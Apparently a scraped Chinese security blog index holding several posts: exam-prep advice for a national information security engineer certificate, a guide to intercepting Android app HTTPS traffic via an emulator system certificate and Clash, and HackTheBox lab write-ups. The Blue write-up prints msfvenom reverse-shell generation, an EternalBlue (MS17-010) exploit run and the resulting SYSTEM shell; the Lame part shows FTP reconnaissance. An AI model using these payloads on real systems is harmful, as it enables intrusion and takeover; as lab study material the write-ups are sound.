备考需要的材料，一般就是官方教材《信息安全工程师教程》+历年真题（含解析），其他还可以有视频或音频+课件+干货资料+其他资料。报班学习和教辅材料看个人吧。 核心还是熟读教材+准备复习资料+题海战术。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:0","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"备考材料： 教材（第二版）￥40（盗版） 软考通APP ￥0 《信息安全工程师5天修炼》（第二版）￥34.2 《信息安全工程师考前冲刺100题》￥30 买教材和教辅需要注意一下版本是否最新。注意查看官网每年的考试大纲有没有变化，教程官网有购买链接。 我的备考时间：2个月，中间有个十一假期可以全天学习 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:1","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"备考安排： 1.利用碎片时间刷题； 2.通读一遍考试大纲，知道考什么；通读一遍教材，大概有个印象；对照着大纲，把重点内容多看看； 3.错题集，刷题过程中遇到的错题，不光看解析，还要去翻翻书，复习知识点，加深印象； 4.综合应用部分知识点多看多学。 5.教辅中的重点吃透。 总的来说就还是熟读教材、题海战术。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:2","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"四、考后查分 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:0","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"查成绩： 两门科目成绩都在45分以上则通过考试。 去年查成绩的时间是12月15日，查询方式如下： 方式一：登录中国计算机技术职业资格网-成绩查询入口：输入“姓名”、“准考证号”（或“证件号码”）查询成绩。 方式二：登录中国计算机技术职业资格网-报名系统：输入注册账号和密码查询成绩； 考试通过后，需要再等段时间就可以查询证书，获取证书管理编号。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:1","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"查证书： 时间1月3日，距离考试结束2个月左右 电子证书在线查询： 全国专业技术人员职业资格证书-查询验证系统 ：没注册过的同学需要先注册个用户，这里可以先下载电子版证书。 计算机技术与软件专业技术资格（水平）考试-证书查询 ：可查询证书管理编号及有效性。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:2","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"证书领取（未经历） 证书领取时间一般在考试结束后5-6个月左右开始领取，如上半年5月份软考证书领取时间一般从10月底开始，下半年11月份软考证书领取时间则一般在次年3月底陆续开始。 各省领取时间有所不同，具体请考生关注当地软考办官网或人事考试网。 证书领取方式： 个人领证：凭本人有效身份证原件等资料领取; 他人(单位)代领：凭代领人及持证人有效身份证原件等资料领取(有些地区不支持代领); 证书邮寄：网上申请证书邮寄(部分地区支持)。 证书领取流程：携带相关资料证件，如身份证、准考证、成绩单等; 填写《专业资格考试登记表》。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:3","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"五、注意事项 软考不能补报名或补缴费，错过报名或缴费的，均视为放弃报名，只能来年再战了。 考试报名严格执行属地化管理，现工作地或居住地为北京地区的报考人员方可在北京报名参加考试。 软考没有补考，失败了只能来年再战。 当前是信息安全工程师（第二版），购买教辅材料时注意区分。 tag: #证书 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:5:0","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["Pentest"],"content":"Mac 下Android APP抓包配置.","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"换了M系列芯片的Mac，过去常用的模拟器都不太支持，之前用谷歌的Android-emulator-m1-preview，后来支持Android Studio了，就用Android Studio配置测试环境。 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:0:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"一、难点： APP存在root检测； APP不走WiFi设置的代理； HTTPS抓包无法解密； 传统抓包无效 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:1:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"二、思路： 模拟器（Android Studio 的 AVD） 代理转发工具（Clash） 抓包软件（burpsuite，Charles，Fiddler都行），导入系统证书解密https 所需工具即：一个合适的模拟器+支持https的抓包软件+流量转发工具 本文即AVD+Clash+Burp ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:2:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"三、行动 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.1 创建Android Virtual Device（AVD） 国内的各种模拟器不太支持m1芯片，于是就上手Android Studio中的 AVD。 配置自己选合适的，我是 Pixel 5 + Tiramisu(API 33)，需要多试几个版本 可能遇到的问题： Android版本太低，APP不支持； Android版本有root，APP存在检测，不允许在root环境下运行； Android架构冲突，APP无法安装； 其他 创建过程如下： Open一个空文件夹作为新项目，或者直接选择Profile or Debug APK加载一个APK都可以。 进入项目后，点击右侧Device Manager – Create device创建AVD模拟器，挑选Android系统镜像时根据需要选择合适的系统。 设置完之后就会在Device Manager列表中出现一个新的模拟器。 建议先启动一下模拟器，检查纯净状态下网络是否正常、待测试APK能否顺利安装并正常运行。 一切顺利的话，接下去安装Clash和Burp系统证书。 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:1","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.2 创建burp证书 高版本Android系统，导入证书安装后一般都是用户证书，我们需要花点功夫将其变成系统证书。 打开burp，电脑浏览器访问\"http://burp“并下载证书cacert.cer，获得证书文件cacert.cer之后，准备将其转换成可放入系统证书库的文件。 下列方法一和二本质是一样的，都行。 方法一： openssl x509 -inform DER -subject_hash_old -in 证书文件.cer 获得红框中的hash值并把它作为后续的放入到系统证书库的证书名字，一般burp的证书名为（9a5ba575.0） openssl x509 -inform DER -text -in 证书文件.cer \u003e hash值.0 方法二： 先将burp的证书转换为pem格式，再计算其hash值，然后重命名为可以导入Android系统的xxx.0文件。 xavier@Mac Desktop % openssl x509 -inform DER -in 2.der -out 2.pem xavier@Mac Desktop % openssl x509 -inform PEM -subject_hash_old -in 2.pem| head -1 9a5ba575 xavier@Mac Desktop % cp 2.pem 9a5ba575.0 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:2","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.3、导入系统证书 3.3.1 坑点1： 获得了修改好的证书文件（9a5ba575.0）之后，就需要将证书放入AVD的目录当中，直接adb push会报command not found，Read-only，直接adb root 、adb remount也会报错。 报错记录： xavier@Mac Desktop % adb root zsh: command not found: adb xavier@Mac Desktop % adb root restarting adbd as root xavier@Mac Desktop % adb remount /system/bin/sh: remount: inaccessible or not found xavier@Mac Desktop % adb push 9a5ba575.0 /system/etc/security/cacerts/ 9a5ba575.0: 1 file pushed, 0 skipped. 7.2 MB/s (1330 bytes in 0.000s) adb: error: failed to copy '9a5ba575.0' to '/system/etc/security/cacerts/9a5ba575.0': remote couldn't create file: Read-only file system xavier@Mac Desktop % adb root adbd is already running as root 3.3.2 配置SDK环境变量 启动AVD之前，需要配置一下Android相关的环境变量。 打开 .bash_profile 写入环境变量：vim ~/.bash_profile。 # Android SDK export ANDROID_HOME=~/Library/Android/sdk export PATH=\"$ANDROID_HOME/emulator:$ANDROID_HOME/tools:$ANDROID_HOME/tools/bin:$ANDROID_HOME/cmdline-tools/latest:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH\" 保存并退出，source ~/.bash_profile并使其生效。 注意：如果没有重启终端，新打开的终端默认加载旧的配置，需要手动source ~/.bash_profile使其生效。 3.3.3 emulator启动AVD 现在我们必须将 CA 证书放在位于Android 文件系统中的/system/etc/security/cacerts/系统证书存储库中。默认情况下，/system分区以只读方式挂载。因此需要获得/system分区的写入权限并复制上一步中创建的证书。 通过命令行配置启动参数的方式运行AVD（参考：解决Android Studio ADV模拟器无法使用remount命令记录），就可以以写的方式启动AVD并向系统目录写入证书文件。 进入到AVD目录并以 “-writable-system” 的方式启动AVD 注意：如果你想使用你的证书，你必须使用 -writable-system 选项启动模拟器。否则 Android 将加载“干净”的系统镜像。 cd /Users/xxx/Library/Android/sdk/emulator/ #查看模拟器名字 ./emulator -list-avds ./emulator -avd '@模拟器名字' -writable-system 然后就可以看到AVD运行了起来， 如果能选用的Android镜像API Level \u003e28（Android 9.0以上），则可能需要禁用安全启动验证，API Level\u003c=28（Android 9.0及以下）可以跳过这步。 $ adb root $ adb shell avbctl disable-verification # 禁用安全启动验证 $ adb reboot 此时再在控制台执行remount命令挂载文件系统，接着就可以push我们修改好的系统证书文件了。 $ adb root $ adb remount # 如果 adb 告诉您需要重新启动，请再次重新启动 adb reboot 并再次运行 adb remount #推入证书 $ adb push /path/to/burp-cert /system/etc/security/cacerts/ $ adb push 9a5ba575.0 /system/etc/security/cacerts/ 检查证书权限： xavier@Mac emulator % adb shell ls -al /system/etc/security/cacerts/ | grep 9a -rw-r--r-- 1 root root 8650 2022-07-08 05:11 3c9a4d3b.0 -rw-r--r-- 1 root root 1330 2023-01-05 14:50 9a5ba575.0 -rw-r--r-- 1 root root 2938 2022-07-08 05:11 9aef356c.0 -rw-r--r-- 1 root root 2760 2022-07-08 05:11 ed39abd0.0 检查是否成功加入系统证书： 安卓模拟器： 设置-安全-更多安全设置-加密与凭据-信任的凭据： 不同版本的Android系统路径也不一样，可以进设置后直接搜索“凭据” 或“cerdentials”。AVD启动后默认语言是英语，可以自行修改。 3.3.4 补充说明： 通过命令行启动AVD 根据API差异，可能存在不同。 API LEVEL \u003e 28 的说明： Tested on emulators running API LEVEL 29 and 30 $ emulator -list-avds $ emulator -avd \u003cavd_name_here\u003e -writable-system # (如果要看内核日志，可以加上 -show-kernel) $ adb root $ adb shell avbctl disable-verification # 禁用安全启动验证 $ adb reboot $ adb root $ adb remount # 将分区重新挂载为读写 $ adb push \u003cpath_to_certificate\u003e /system/etc/security/cacerts $ adb shell chmod 664 /system/etc/security/cacerts/\u003cname_of_pushed_certificate\u003e $ adb reboot API LEVEL \u003c= 28 的说明： Tested on emulators running API LEVEL 26, 27 and 28 $ emulator -list-avds $ emulator -avd \u003cavd_name_here\u003e -writable-system # (如果要看内核日志，可以加上 -show-kernel) $ adb root $ adb remount # 将分区重新挂载为读写 $ adb push \u003cpath_to_certificate\u003e /system/etc/security/cacerts $ adb shell chmod 664 /system/etc/security/cacerts/\u003cname_of_pushed_certificate\u003e $ adb reboot ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:3","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.4 抓包（clash+burp） 3.4.1.安装配置Clash 网上找了一个clash for Android：下载链接 ClashForAndroid：https://github.com/Kr328/ClashForAndroid 相关教程（没用到） 安装clash，可以直接用adb install： xavier@Mac emulator % adb install ~/Downloads/cfa-2.5.12-foss-universal-release.apk Performing Streamed Install Success 配置yaml规则文件，只要将配置文件中的server和port修改成burp监听的ip和port就可以了（至于其他配置，可以查阅相关文档进行自定义的配置） mixed-port: 7890 allow-lan: false mode: global log-level: info external-controller: 127.0.0.1:9090 proxies: - name: \"burp\" type: http server: 192.168.70.72 port: 8080 proxy-groups: - name: Proxy type: select proxies: - burp 修改完之后直接adb push到AVD当中。 % adb push ~/Desktop/clash-config.yml /sdcard/ /Users/xavier/Desktop/clash-config.yml...kipped. 1.9 MB/s (252 bytes in 0.000s) 然后打开clash，“配置–\u003e+–\u003e文件:从文件导入–\u003e浏览文件–\u003e更多:导入\"从文件导入配置就可以了。 使用时在\"配置\"中勾选刚导入的配置文件 点击运行： 进入”代理“，点击右下角闪电标志，测试代理是否正常，测试连接出现数字表明连接正常。 3.4.2 burp代理设置 burp部分的代理不多说了 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:4","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"四、其他-待补充 burp那一块换成charles和fiddler抓包，也是可以的 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:4:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"参考文章： 整合一个Android抓包新姿势（AVD+https+remount+clash代{过}{滤}理转发+burp 版）——52破解-Fythem clash各平台使用教程：除了下载文件，其他没怎么用上 adb 导入 burp 证书：Android系统证书的制作 Android Studio 自带模拟器获取root权限：用了第一部分，实现导入系统证书 Install System CA Certificate on Android Emulator #解决问题 #APK #AVD #Android #clash #Burp ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:5:0","tags":["Android","Pentest"],"title":"Mac下Android APP抓包配置","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["靶场"],"content":"Blue 简介 OS：Windows； 难度：Easy ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:1:0","tags":["OSCP","HTB"],"title":"HTB靶机 Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["靶场"],"content":"WriteUp 连接HTB靶场：sudo openvpn xxxx.ovpn 测试靶机连通性： ┌──(xavier㉿xavier)-[~] └─$ ping -c 4 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=238 ms 64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=237 ms 64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=240 ms --- 10.10.10.40 ping statistics --- 4 packets transmitted, 3 received, 25% packet loss, time 3035ms rtt min/avg/max/mdev = 237.404/238.524/240.313/1.277 ms 有点延迟和丢包，扫描探测结果可能不准确，需要复核。 ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:2:0","tags":["OSCP","HTB"],"title":"HTB靶机 Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["靶场"],"content":"0.SCAN masscan 扫描全端口+ nmap 扫描详细端口信息 ┌──(xavier㉿xavier)-[~] └─$ sudo masscan -e tun0 -p- --max-rate 500 10.10.10.40 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-21 05:48:42 GMT Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 49156/tcp on 10.10.10.40 Discovered open port 49152/tcp on 10.10.10.40 Discovered open port 49154/tcp on 10.10.10.40 Discovered open port 49155/tcp on 10.10.10.40 Discovered open port 445/tcp on 10.10.10.40 Discovered open port 49153/tcp on 10.10.10.40 Discovered open port 49157/tcp on 10.10.10.40 Discovered open port 135/tcp on 10.10.10.40 Discovered open port 139/tcp on 10.10.10.40 ┌──(xavier㉿xavier)-[~] └─$ sudo nmap -p135,139,445,49152-49157 -sSV 10.10.10.40 --script=default,vuln Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 14:04 HKT Nmap scan report for 10.10.10.40 Host is up (0.24s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open unknown 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_clock-skew: mean: 4m02s, deviation: 6s, median: 3m58s |_smb-vuln-ms10-054: false | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-03-21T06:09:59+00:00 | smb2-time: | date: 2022-03-21T06:09:58 |_ start_date: 2022-03-21T05:42:34 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 117.51 seconds 发现 存在 smb ms17-010（CVE-2017-0143），操作系统为：Windows 7 Professional 7601 Service Pack 1 ，计算机名: haris-PC 非MSF ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:3:0","tags":["OSCP","HTB"],"title":"HTB靶机 Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["靶场"],"content":"1. MS17-010 利用 不用msf去攻击 nmap 只有检测脚本，没有利用脚本，通过网络expdb、Github搜索利用工具。 最后找了这个：https://github.com/3ndG4me/AutoBlue-MS17-010 下载代码，并安装依赖，这里我使用了Pipenv创建了单独的环境。 └─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010/ └─$ pip install -r requirements.txt 制作利用代码，可以利用shellcode文件夹下的 shell_prep.sh 辅助生成。 这里直接使用msfvenom进行生成，并加入shellcode混合 (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010/ └─$ nasm -f bin eternalblue_kshellcode_x64.asm -o evilKernel.bin (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010/shellcode] └─$ msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.2 LPORT=4444 -f raw -o evilReverse.bin [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Saved as: evilReverse.bin (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010/shellcode] └─$ cat evilKernel.bin evilReverse.bin \u003e evilPayload.bin 依据Github 的Readme 命令帮助，输入目标ip，payload 和Groom连接数，执行利用脚本： python eternalblue_exploit7.py \u003cTARGET-IP\u003e \u003cPATH/TO/SHELLCODE/sc_all.bin\u003e \u003cNumber of Groom Connections (optional)\u003e (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010] └─$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin 2 shellcode size: 1232 numGroomConn: 2 Target OS: Windows 7 Professional 7601 Service Pack 1 SMB1 session setup allocate nonpaged pool success SMB1 session setup allocate nonpaged pool success good response status: INVALID_PARAMETER done (HTB) ┌──(xavier㉿xavier)-[~/HTB/AutoBlue-MS17-010] └─$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin 24 shellcode size: 1232 numGroomConn: 24 Target OS: Windows 7 Professional 7601 Service Pack 1 SMB1 session setup allocate nonpaged pool success SMB1 session setup allocate nonpaged pool success good response status: INVALID_PARAMETER done 这里 \u003cNumber of Groom Connections (optional)\u003e虽然是可选项，但经过多次不成功后，我按照参考文献2进行设置，同样在多次尝试后，成功获得shell，且为System权限。 ┌──(xavier㉿xavier)-[~] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.40] 49159 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system C:\\Windows\\system32\u003ecd C:\\Users\\haris\\Desktop cd C:\\Users\\haris\\Desktop C:\\Users\\haris\\Desktop\u003etype user.txt type user.txt 6349f910cd5b7ddae73521237f8e90c3 C:\\Users\\haris\\Desktop\u003etype C:\\Users\\Administrator\\Desktop\\root.txt type C:\\Users\\Administrator\\Desktop\\root.txt 3515d002af86dbfff3ce6f9bbffe7ede 利用他人的工具，最后做出来了，但让我意识到对漏洞的一知半解，在攻击过程中会消耗大量的时间，甚至走上弯路。平时需要加强对漏洞的研究，了解漏洞的相关影响因素。 MSF: 略 ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:4:0","tags":["OSCP","HTB"],"title":"HTB靶机 Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["靶场"],"content":"他山之石 Hack The Box - Blue (Without Metasploit) 用了superscan 用了其他exp，python2脚本 Hack The Box - Blue Walkthrough without Metasploit 使用了同一种方法，numGroomConn 需要尝试多次 WriteUp: HackTheBox Blue 使用了kali自带的searchsploit 去找利用脚本，并进行修改利用 ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:5:0","tags":["OSCP","HTB"],"title":"HTB靶机 Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["靶场"],"content":"Lame 简介： Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement Tags： Injection, CMS Exploit, Linux, Web, PHP, Password Reuse Rating: 4.4 Skills： Linux基础 枚举端口和服务 识别有漏洞的服务 利用Samba漏洞 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:1:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"Pentest ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:2:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"0.SCAN 扫下IP： $ sudo nmap -sSV -T4 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:43 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:3:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"1.ftp $ sudo nmap -T4 -sC -p21 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:47 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 21/tcp open ftp |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 匿名登录ftp查看一下 $ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:xavier): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp\u003e pwd 257 \"/\" ftp\u003e bye 421 Timeout. 尝试vsftp对应的漏洞 $ locate *.nse | grep vsftp /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse $ sudo nmap --script ftp-vsftpd-backdoor.nse -p21 10.10.10.3 -T4 -sSV Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 15:50 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 Service Info: OS: Unix 